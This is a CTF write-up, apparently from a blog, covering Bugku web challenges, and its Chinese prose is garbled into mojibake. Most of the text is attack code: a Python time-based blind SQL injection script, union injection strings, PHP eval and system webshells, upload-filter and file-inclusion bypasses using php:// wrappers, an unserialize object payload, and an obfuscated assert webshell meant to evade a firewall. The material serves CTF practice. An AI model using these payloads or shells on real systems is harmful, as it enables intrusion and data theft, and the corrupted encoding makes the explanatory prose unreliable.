ÔºöX-Forwarded-For: 1‚Äô and sleep(5) and ‚Äò1‚Äô = ‚Äò1Ê≥®ÊÑè‰∏çËÉΩÁî®Êù•Êã¨Âè∑Èó≠Âêà ÔºÅÔºÅËÑöÊú¨Â¶Ç‰∏ã: ÂΩìÂàùÊÉ≥ÁöÑÊòØËá™Âä®ÂåñËÑ±Ë£§‚Ä¶‰ª£Á†ÅÊúâÁÇπÁÆÄÈôãÔºåÈúÄË¶ÅÂÆåÂñÑÁöÑÂú∞ÊñπËøòÊòØÊå∫Â§öÁöÑ„ÄÇ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172# encoding:utf-8import requests,time,stringcharacters = string.ascii_letters + string.digits + string.punctuationmax_length = 50target = 'https://120.24.86.145:8002/web15/'cur_database = "'+(select case when (substring((select database() ) from &#123;0&#125; for 1)='&#123;1&#125;') " \ "then sleep(4) else 1 end) and '1'='1"# ÁåúËß£Â≠óÊØçdef get(payload): flag = '' for i in range(1, max_length): # i Ë°®Á§∫‰∫ÜÊâÄË¶ÅÊü•ÊâæÁöÑÂêçÂ≠óÁöÑÊúÄÂ§ßÈïøÂ∫¶ next_position = False for char in characters: # 0x80=128 , 0x20=32, 32-128‰∏∫ÂèØÊòæÁ§∫ÁöÑÂ≠óÁ¨¶ÁöÑÂå∫Èó¥ payload_ = payload.format(str(i), char) headers = &#123; 'X-Forwarded-For': payload_ &#125; try: r = requests.get(target,headers=headers,timeout=4) except requests.exceptions.ReadTimeout: flag += char print(flag) next_position = True break if not next_position: return flag# ÊåáÂÆöÊï∞ÊçÆÂ∫ìÔºåËé∑ÂèñÂÖ∂‰∏ãÂÖ®ÈÉ®Ë°®Âêçdef get_table(database): for i in range(0,5): print("Ê≠£Âú®Êü•ËØ¢Êï∞ÊçÆÂ∫ì" + database + "‰∏≠ÁöÑË°®") payload = "'+(select case when (substring((" \ "select table_name from information_schema.tables where table_schema='"+ database + "' limit 1 offset "+ str(i) +") " \ "from &#123;0&#125; for 1)='&#123;1&#125;') " \ "then sleep(4) else 1 end) and '1'='1" table = get(payload) print( "Êï∞ÊçÆÂ∫ì" + database + "ÁöÑÁ¨¨"+ str(i+1) +"‰∏™Ë°®"+table) get_col(table) if not table: print('Êï∞ÊçÆÂ∫ì'+database+'‰∏≠ÁöÑË°®Êü•ËØ¢ÂÆåÊØï') break# Êü•Â≠óÊÆµdef get_col(table): for i in range(0,5): print("Ê≠£Âú®Êü•ËØ¢Ë°®" + table + "‰∏≠ÁöÑÂ≠óÊÆµ") payload = "'+(select case when (substring((" \ "select column_name from information_schema.columns where table_name='"+ table +"' limit 1 offset "+ str(i) +") " \ "from &#123;0&#125; for 1)='&#123;1&#125;') " \ "then sleep(4) else 1 end) and '1'='1" column = get(payload) print("Ë°®" + table + "ÁöÑÁ¨¨" + str(i+1) + "‰∏™Â≠óÊÆµ‰∏∫" + column ) # print(column) if not column: print("Ë°®" + table + "‰∏≠ÁöÑÂ≠óÊÆµÊü•ËØ¢ÂÆåÊØï") break# # ‰Ωú‰∏∫ÂçïÁã¨ÁöÑÊ®°Âùó‰ΩøÁî®Âêß,Ëé∑ÂèñÂ≠óÊÆµËØ¶ÁªÜ‰ø°ÊÅØ# def result(column,table):# payload = "'+(select case when (substring((select "+column+" from "+table+") from &#123;0&#125; for 1)='&#123;1&#125;') " \# "then sleep(4) else 1 end) and '1'='1"# print(get(payload))# a = 'flag'# result(a,a)if __name__ == "__main__": database1 = get(cur_database) table1 = get_table(database1) ÊúÄÂêé‰ΩøÁî®‰∏äÈù¢Ë¢´Ê≥®ÈáäÊéâÁöÑÈÇ£‰∏™Ê®°ÂùóÔºåËé∑ÂèñflagÔºöflag{cdbf14c9551d5be5612f7bb5d2867853} sql2 È¢òÁ§∫‰ø°ÊÅØÔºö hintÔºöÂÖ®ÈÉΩtmËøáÊª§‰∫ÜÁªùÊúõÂêóÔºü ÊèêÁ§∫ !,!=,=,+,-,^,%ËøôÈ¢òÂΩìÊó∂ÊàëÁî®brupÁàÜÁ†¥Ë¢´ËøáÊª§ÁöÑÂ≠óÁ¨¶‰πüÊ≥®‰∫ÜÂæà‰πÖÔºåsqlmap‰πüË∑ë‰∫ÜÂ∞±ÊòØË∑ë‰∏çÂá∫‰∏äÈù¢ÈïøÂ∫¶370ÁöÑÊòØÈÉΩË¢´ËøáÊª§‰∫ÜÁöÑ„ÄÇÂêéÊù•ËøòÊòØÊîæÂºÉ‰∫ÜÔºåÂéªÁúã‰∫Ü‰∏ãwpÔºåÂèëÁé∞ËøòÊòØÊàëÂ§™Â§©Áúü‰∫ÜÔºåÊòØ.DS_StoreÊ∫êÁ†ÅÊ≥ÑÈú≤È¢ò„ÄÇ .DS_StoreÊñá‰ª∂Ê≥ÑÈú≤Âà©Áî®ÁÆÄ‰ªãDS_StoreÊòØMac‰∏ãFinderÁî®Êù•‰øùÂ≠òÂ¶Ç‰ΩïÂ±ïÁ§∫ Êñá‰ª∂/Êñá‰ª∂Â§π ÁöÑÊï∞ÊçÆÊñá‰ª∂ÔºåÊØè‰∏™Êñá‰ª∂Â§π‰∏ãÂØπÂ∫î‰∏Ä‰∏™„ÄÇÂ¶ÇÊûúÂºÄÂèë‰∫∫ÂëòÂ∞Ü.DS_Store‰∏ä‰º†ÈÉ®ÁΩ≤Âà∞Á∫ø‰∏äÁéØÂ¢ÉÔºåÂèØËÉΩÈÄ†ÊàêÊñá‰ª∂ÁõÆÂΩïÁªìÊûÑÊ≥ÑÈú≤ÔºåÁâπÂà´ÊòØÂ§á‰ªΩÊñá‰ª∂„ÄÅÊ∫ê‰ª£Á†ÅÊñá‰ª∂ .DS_StoreÊñá‰ª∂Ê≥ÑÈú≤Âà©Áî®ËøôÈáå‰ΩøÁî®ds_store_expËÑöÊú¨Âà©Áî®„ÄÇ 1python ds_store_exp.py 120.24.86.145:8007/web2/.DS_Store ÊïàÊûúÔºö ÂΩìÁÑ∂Âú®Ëøô‰πãÂâçÈúÄË¶ÅÔºö‰ΩøÁî®Â∑•ÂÖ∑niktoÂØπËØ•ÁΩëÈ°µËøõË°åÊâ´ÊèèÔºåÂèØ‰ª•ÂèëÁé∞/web2/Â≠êÁõÆÂΩï‰∏ãÊúâ.DS_StoreÊñá‰ª∂Ê≥ÑÈú≤ÁöÑÊºèÊ¥û Â§á‰ªΩÊòØ‰∏™Â•Ω‰π†ÊÉØËøôÈáåÊé®Ëçê‰∏Ä‰∏™CTF‰∏≠Â∏∏ËßÅÁöÑÊ∫êÁ†ÅÊ≥ÑÈú≤Âà©Áî®Â∑•ÂÖ∑ÔºåÂÖ∂ÂÆûÂ∞±ÊòØ‰∏Ä‰∏™ÁàÜÁ†¥Â≠óÂÖ∏ÊãøÂà∞‰∏Ä‰∏™index.php.bak 123456789101112131415161718192021&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."ÂèñÂæóflag";&#125;?&gt; Âº±Á±ªÂûãÊï∞ÁªÑÁªïËøáÔºö1https://120.24.86.145:8002/web16/index.php?kekeyy1[]=0&amp;kkeyey2[]=a Flag:Bugku{OH_YOU_FIND_MY_MOMY} Ê±ÇgetshellÊñá‰ª∂‰∏ä‰º†È¢òÔºöÂàùÊ≠•ËÆ§ÂÆöÔºåÈªëÂêçÂçï+content-typeÈ™åËØÅÔºå‰∏ä‰º†.htaccessÂèØ‰ª•ÊàêÂäü‰ΩÜÊòØ‰ºöË¢´ÊîπÂêçÂõæÁâáÈ©¨‰πü‰∏ä‰∫ÜÔºåÊ≤°Âú∞ÊñπÂåÖÂê´‚Ä¶ÊÑüËßâÈ¢òÁõÆÊúâÁÇπÂ•áÊÄ™„ÄÇ„ÄÇÁúã‰∫Üwp‰πãÂêé ÊîπÁöÑÊòØË°®ÂçïÊèê‰∫§ÁöÑContent-Type: MUltipart/form-data ËøõË°åÂ§ßÂ∞èÂÜôÁªïËøá‚Ä¶. Êñá‰ª∂ÂåÖÂê´2ÁúãÊ∫êÁ†ÅÔºöÊñá‰ª∂‰∏ä‰º†Ôºå‰º†‰∫Ü‰∏™&lt;?php phpinfo()?&gt; ËøáÊª§‰∫Ü&lt;?Ôºå‰ΩÜÊòØ&lt;Ê≤°ËøáÊª§‚Ä¶..‰º†‰∫Ü‰∏™‰∏ÄÂè•ËØùÊú®È©¨1&lt;script language=php&gt;eval($_POST['A'])&lt;/script&gt; ËèúÂàÄËøû‰∏ç‰∏äÔºåËØïËØïÂëΩ‰ª§ÊâßË°å„ÄÇ123&lt;script language=php&gt; system("ls")&lt;/script&gt; ÁúãÂà∞flag123&lt;script language=php&gt;system("cat this_is_th3_F14g_154f65sd4g35f4d6f43.txt")&lt;/script&gt; SKCTF{uP104D_1nclud3_426fh8_is_Fun} ËøôÊòØ‰∏Ä‰∏™Á•ûÂ•áÁöÑÁôªÈôÜÊ°ÜburpÊäìÂåÖÂàÜÊûêÔºåÊúâÂõûÊòæÁöÑÁõ≤Ê≥®ÔºåÊîπ‰∏Ä‰∏ã‰∏äÈù¢ÈÇ£‰∏™ËÑöÊú¨Â∞±Ë°åÔºåËøôÈáåÁõ¥Êé•ÂØºÂá∫Êï∞ÊçÆÂåÖÁõ¥Êé•Ë∑ësqlmap1SQLmap.py -r &quot;path&quot; -p admin_name --dbs cookiesÊ¨∫È™óÈ¢òÁõÆÂú∞ÂùÄÔºöhttps://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=ËøôÊ†∑ËÆøÈóÆËøõÂéªÔºöÊòæÁ§∫‰∏ÄË°å‰π±‰∏ÉÂÖ´Á≥üÁöÑÂ≠óÊØçfilenameÂêéÂèÇÊï∞base64Ëß£ÂØÜÔºökeys.txt ËøôÈáåÂ∞±ÂæóÊÉ≥‰∏Ä‰∏ãÁî®Ëøô‰∏™ÊñπÊ≥ïÁúãindex.phpÔºåbase64ÁºñÁ†ÅÂêéhttps://120.24.86.145:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhwËøôÈáåËøòÊúâ‰∏Ä‰∏™lneÂèÇÊï∞ÔºåÊéßÂà∂‰ª£Á†ÅË°åÊï∞ÔºåÁî®ËÑöÊú¨ÊääÊ∫êÁ†ÅÊãøÂá∫Êù•Ôºö12345678910# encoding:utf-8import requests,reline = 1while line &lt; 100: url = 'https://120.24.86.145:8002/web11/index.php?line='+str(line) +'&amp;filename=aW5kZXgucGhw' s = requests.session() responce = s.get(url) print(responce.text) line = line + 1 Ê∫êÁ†ÅÂ¶Ç‰∏ãÔºö1234567891011121314151617&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; ‰º™ÈÄ†cookie Ôºömargin=margin ËÆøÈóÆÔºö/web11/index.php?line=&amp;filename=a2V5cy5waHA ÂÖ∂‰∏≠a2V5cy5waHA ÊòØkeys.php base64Âä†ÂØÜÂêéÁöÑÂæóÂà∞flagÔºö&lt;?php $key=‚ÄôKEY{key_keys}‚Äô; ?&gt; flagÂú®indexÈáåÈù¢ÁÇπ‰∏ÄÁÇπÈìæÊé•ÔºåurlÂèòÊàê‰∫ÜÔºö1https://120.24.86.145:8005/post/index.php?file=show.php ËøôÊ†∑Â∫îËØ•Â∞±ÊòØphpÔºåÂåÖÂê´‰∫ÜÊàë‰ª¨getËæìÂÖ•ÁöÑfileÂèÇÊï∞„ÄÇÈóÆÈ¢òÊòØ‰ªñËØ¥flagÂú®index.phpÔºåÊàëÊÄé‰πàÊ†∑ÈÉΩËØª‰∏çÂá∫„ÄÇÂêéÊù•ÊÉ≥Âà∞Êñá‰ª∂ÂåÖÂê´ÈáåÈù¢ÂèØ‰ª•Áî®PHPÁöÑfilterÊù•ËØªphpÊñá‰ª∂(‰∏çÈúÄË¶Åallow_url_include)Ôºö1file=php://filter/read=convert.base64-encode/resource=./index.php base64Ëß£ÂØÜÂêéÔºö123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data"))&#123; echo "Oh no!"; exit(); &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; flag{edulcni_elif_lacol_si_siht} nerver give upÁúãÊ∫êÁ†ÅÔºö1p.htmlË¢´Ë∑≥ËΩ¨‰∫ÜÔºåView-source: ÁúãÊ∫êÁ†Å ÂæóÂà∞Ôºö123456789101112131415161718&lt;HTML&gt;&lt;HEAD&gt;&lt;SCRIPT LANGUAGE="Javascript"&gt;&lt;!--var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt;&lt;/SCRIPT&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;/BODY&gt;&lt;/HTML&gt; Ëß£Á†ÅÂêéÔºö1234567891011121314151617181920212223242526272829303132var Words ="&lt;script&gt;window.location.href='https://www.bugku.com';&lt;/script&gt; ";if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.')) //‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôÁöÑÔºåËøîÂõûÁ¨¨‰∏Ä‰∏™.ÁöÑ‰ΩçÁΩÆ ËøôÈáå‰∏çËÉΩÊúâ‚Äú.‚Äù&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r'); //Âä†‰∏ä@Â±èËîΩÈîôËØØ‰ø°ÊÅØif($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("f4l2a3g.txt");&#125;else&#123; print "never never never give up !!!";&#125;?&gt;function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt; ÂÖ≥ÈîÆÁöÑ‰∏ÄÊÆµÈúÄË¶ÅÁªïËøáÁöÑÂú∞ÊñπÔºö1if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4) eregiÊúâ%00Êà™Êñ≠ÁöÑÊºèÊ¥ûÔºå$dataÂèÇÊï∞Âú®ÂâçÈù¢ÈÖçÂêàfile_get_contents()ÂáΩÊï∞ÔºåÊàë‰ª¨ÂèØ‰ª•php://input‰º†ÂÖ•Ôºöpayload:12hello.php?id=%00&amp;a=php://input&amp;b=%0012345post_dataÔºöbugku is a nice plateform! flag{tHis_iS_THe_fLaG} SQLÁ∫¶ÊùüÊîªÂáª ÂèÇËÄÉÔºö https://www.freebuf.com/articles/web/124537.htmlSQLÁ∫¶ÊùüÊîªÂáªÔºöÊîªÂáªËÄÖ‰ΩøÁî®‰ªªÊÑèË∫´‰ªΩÁöÑÁôªÂΩïÁöÑÊºèÊ¥û 12345678910111213141516171819202122&lt;?php// Checking whether a user with the same username exists$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = "SELECT * FROM users WHERE username='$username'";$res = mysql_query($query, $database);if($res) &#123; if(mysql_num_rows($res) &gt; 0) &#123; // User exists, exit gracefully . . &#125; else &#123; // If not, only then insert a new entry $query = "INSERT INTO users(username, password) VALUES ('$username','$password')"; . . &#125;&#125; È™åËØÅÁôªÂΩï‰ø°ÊÅØÁöÑÈ°µÈù¢Ôºö1234567891011121314&lt;?php$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = "SELECT username FROM users WHERE username='$username' AND password='$password' ";$res = mysql_query($query, $database);if($res) &#123; if(mysql_num_rows($res) &gt; 0)&#123; $row = mysql_fetch_assoc($res); return $row['username']; &#125;&#125;return Null; ÂéüÁêÜÔºöËøôÈáåËøôË°åselectËØ≠Âè•ÔºöSELECT FROM users WHERE username=‚Äôvampire ‚Äò;ÂíåËøôÂè•ÁöÑÊïàÊûúÊòØ‰∏ÄÊ†∑ÁöÑÔºöSELECT FROM users WHERE username=‚Äôvampire‚Äô;SQLÊâßË°åÂ≠óÁ¨¶‰∏≤Â§ÑÁêÜÊó∂ÔºåÂ≠óÁ¨¶‰∏≤Êú´Â∞æÁöÑÁ©∫Ê†º‰ºöË¢´ÂéªÈô§„ÄÇ Âú®insertÊü•ËØ¢‰∏≠ÔºåSQL‰ºöÊ†πÊçÆvarchar(n)Êù•ÈôêÂà∂Â≠óÁ¨¶‰∏≤ÁöÑÊúÄÂ§ßÈïøÂ∫¶Ôºå‰πüÂ∞±ÊòØËØ¥Â§ß‰∫énÁöÑËØùÂ∞±Âè™ÂèñÂâçn‰∏™Â≠óÁ¨¶„ÄÇ ‰∏ãÈù¢Â¶ÇÊûúÊàë‰ª¨Áî®‚Äùadmin 1‚ÄùÂíåÈöè‰æø‰∏Ä‰∏™ÂØÜÁ†Å Êù•Ê≥®ÂÜå‰∏Ä‰∏™Âè∑Â≠êÔºåÂØπ‰∫éÊ≥®ÂÜåÁïåÈù¢ÁöÑselectËØ≠Âè•ÔºåÂÆÉÂπ∂Ê≤°ÊúâÊü•Âà∞Êï∞ÊçÆÂ∫ì‰∏≠ÊúâËØ•Áî®Êà∑ÔºåÊâÄ‰ª•ÊàêÂäüÁªïËøáÔºåËøêË°åÂà∞ÂêéÈù¢ÁöÑinsertËØ≠Âè•ÁöÑÊó∂ÂÄôÔºåÂè™‰ºöÊèíÂÖ•Ââçn‰∏™Â≠óÁ¨¶ÔºåÊâÄ‰ª•ÂΩìÁ©∫Ê†ºË∂≥Â§üÂ§öÁöÑÊó∂ÂÄôÔºåÁõ∏ÂΩì‰∫éÊèíÂÖ•‰∫Ü‰∏Ä‰∏™‚Äùadmin ‚ÄúÊé•‰∏ãÊù•Âà∞ÁôªÂΩïÁöÑÈ°µÈù¢ÔºåÁî®adminÂíå‰πãÂâçÈöè‰æøËæìÂÖ•ÁöÑÂØÜÁ†ÅËøõË°åÁôªÂΩïÁöÑÊó∂ÂÄôÔºåÊêúÁ¥¢ËØ•Áî®Êà∑ÂêçSELECTÊü•ËØ¢ÈÉΩÂ∞ÜËøîÂõûÁ¨¨‰∏Ä‰∏™Êï∞ÊçÆËÆ∞ÂΩï„ÄÇËøôÊ†∑ÁöÑËØùÂ∞±ÂèØ‰ª•‰ΩøÁî®ÂéüÂßãÁî®Êà∑Ë∫´‰ªΩÁôªÂΩï„ÄÇ Èò≤Âæ°ÂäûÊ≥ïÔºöÂ∞ÜÂêçÂ≠óÈÇ£ÂàóÂä†‰∏äUNIQUEÁ∫¶ÊùüÔºå‰Ωø‰πã‰∏çËÉΩÊèíÂÖ•Âè¶‰∏ÄÊù°ËÆ∞ÂΩïÔºåÊ£ÄÊµãÂà∞‰∏§‰∏™Áõ∏ÂêåÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂπ∂insertÊü•ËØ¢Â§±Ë¥•„ÄÇ flag: SKCTF{4Dm1n_HaV3_GreAt_p0w3R} Web8 È¢òÁ§∫‰ø°ÊÅØÔºötxtÔºüÔºüÔºüÔºü123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo "&lt;p&gt;This is flag:" ." $flag&lt;/p&gt;";&#125;else&#123;echo "&lt;p&gt;sorry!&lt;/p&gt;";&#125;&#125;?&gt; extract($_GET)Ê≥®ÂÜåÂèòÈáèÁªïËøáÂäûÊ≥ïÔºöac=aa&amp;f=php://inputdata=aa ÂêéÊù•ËøòÁü•ÈÅì ËÆøÈóÆflag.txtÂêéÂá∫Áé∞flags (‰∏™‰∫∫ËßâÂæóÔºåËøôÁßçÊñπÊ≥ïÁ∫ØÂ±ûÂèñÂ∑ßÔºåÂæàÈöæÁü•ÈÅìÁõÆÂΩï‰∏ãÊúâflag.txtÊñá‰ª∂ÁöÑÔºâhttps://120.24.86.145:8002/web8/?ac=flags&amp;fn=flag.txt ÂÖ∂ÂÆû‰∏çÈöæÂèëÁé∞Ôºå‰∏äÈù¢Âá†‰∏™È¢òÈÉΩÂá∫Áé∞‰∫Üfile_get_contentsÂáΩÊï∞ÔºåËÄå‰∏îÈÉΩÂíåphp‰º™ÂçèËÆÆÊúâÂÖ≥ÔºåËøôÊÑèÂë≥ÁùÄÔºå‰ª•ÂêéÁ¢∞Âà∞Ëøô‰∏™ÂáΩÊï∞ÂèØ‰ª•Â§öÂæÄËøô‰∏™ÊñπÈù¢ÊÉ≥ÊÉ≥ welcome to bugkuÊü•ÁúãÊ∫êÁ†ÅÔºö1234567891011121314you are not the number of bugku ! &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; Êó¢ÁÑ∂Ë¶ÅÁî®‰º™ÂçèËÆÆ‰º†ÂÖ•welcome to the bugkuctfÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•Áî®php://filter/convert.base64-encode/resource=hint.phpËØªÂá∫hint.phpÔºàÁõ¥Êé•ËØªÊòØËØª‰∏çÂá∫Êù•ÁöÑÔºâ ÂæóÂà∞Ôºö1PD9waHAgIA0KICANCmNsYXNzIEZsYWd7Ly9mbGFnLnBocCAgDQogICAgcHVibGljICRmaWxlOyAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9zdHJpbmcoKXsgIA0KICAgICAgICBpZihpc3NldCgkdGhpcy0+ZmlsZSkpeyAgDQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgDQoJCQllY2hvICI8YnI+IjsNCgkJcmV0dXJuICgiZ29vZCIpOw0KICAgICAgICB9ICANCiAgICB9ICANCn0gIA0KPz4gIA== base64Ëß£Á†ÅÂêéÔºö123456789101112&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; __tostringÔºöÂ≠óÁ¨¶Êìç‰ΩúÊó∂Ëß¶Âèë()„ÄÇÁî®ËøôÁßç‰º™ÂçèËÆÆËØªÊñá‰ª∂ÁöÑÊñπÊ≥ïÁöÑÊó∂ÂÄôÔºö‰∏ÄÂÆöË¶ÅÊÉ≥ÁùÄÂ§öÁúãÂá†‰∏™Êñá‰ª∂,ÂÉèindex.php(robots.txt) ‰∏çËÉΩÊºè12345678910111213141516171819202122https://120.24.86.145:8006/test1/txt=php://input&amp;file=php://filter/convert.base64-encode/resource=index.php&amp;password=123&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "‰∏çËÉΩÁé∞Âú®Â∞±Áªô‰Ω†flagÂì¶"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; echo $password ‰ºöËß¶Âèë__tostringÊâÄ‰ª•fileÂèÇÊï∞ÂÜôÂåÖÂê´hint.phpÔºåtxtËøòÊòØ‰πãÂâçÁöÑ‰º™ÂçèËÆÆ‰∏çÂèòÔºåpasswordÂ∞±Áî®‰ª•‰∏ãËÑöÊú¨‰º†ÂÖ•flag.phpÔºåÂ∫èÂàóÂåñÁöÑÊï∞ÊçÆ12345678910111213141516&lt;?phpclass Flag&#123; public $file = 'Flag.php'; public function __tostring() &#123; if (isset($this-&gt;file)) &#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125;&#125;$a = new Flag();echo serialize($a);?&gt; password = O:4:‚ÄùFlag‚Äù:1:{s:4:‚Äùfile‚Äù;s:8:‚Äùflag.php‚Äù;} payload:12https://120.24.86.145:8006/test1/?txt=php://input&amp;file=php://filter/convert.base64-encode/resource=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;dataÔºöwelcome to the bugkuctf ÊãøÂà∞flagflag{php_is_the_best_language} Êú¨Âú∞ÂåÖÂê´È¢òÁõÆÊ∫êÁ†ÅÔºö123456&lt;?php include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__);?&gt; ‰ΩøÁî®?hello=file(‚Äòflag.php‚Äô)ÊàñËÄÖ?hello=show_source(‚Äòflag.php‚Äô) Á≠âÂèØ‰ª•ËØªÂèñÊ∫êÁ†ÅÁöÑÂáΩÊï∞ÊàñËÄÖÊûÑÈÄ†var_dump($a) Èó≠Âêà ÊàêÁª©ÂçïËøáÊª§‰∫Ü‚Äì+ÔºåÂ∑≤Âà§Êñ≠Â≠óÊÆµ4‰∏™1id=-2&apos; union select 1,2,3,database() # Êü•Âá∫Êï∞ÊçÆÂ∫ìÔºöskctf_flag1id=-2&apos; union select 1,2,3,table_name from information_schema.tables where table_schema=&apos;skctf_flag&apos; # Êü•Âá∫Ë°®Ôºöfl4g1id=-2&apos; union select 1,2,3,column_name from information_schema.columns where table_name=&apos;fl4g&apos; # Êü•Âá∫Â≠óÊÆµskctf_flag1id=-2&apos; union select 1,2,skctf_flag,4 from skctf_flag.fl4g # Êü•Âá∫flagÔºöBUGKU{Sql_INJECT0N_4813drd8hz4} ÂêÑÁßçÁªïËøáÊ∫êÁ†ÅÔºö12345678910111213141516171819 &lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']);$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; ‰∏§‰∏™‰∏çÁõ∏Á≠âÁöÑÂÄºÔºå‰ΩÜsha1Áõ∏Á≠âÔºö‰∏ÄÊ†∑Áî®Êï∞ÁªÑÁªïËøáÂç≥ÂèØËé∑Âæóflag ËøáÁãó‰∏ÄÂè•ËØùÈ¢òÁ§∫‰ø°ÊÅØÔºöÈÄÅÁªôÂ§ßÂÆ∂‰∏Ä‰∏™ËøáÁãó‰∏ÄÂè•ËØù1&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; 1https://120.24.86.145:8010/index.php?s=phpinfo() 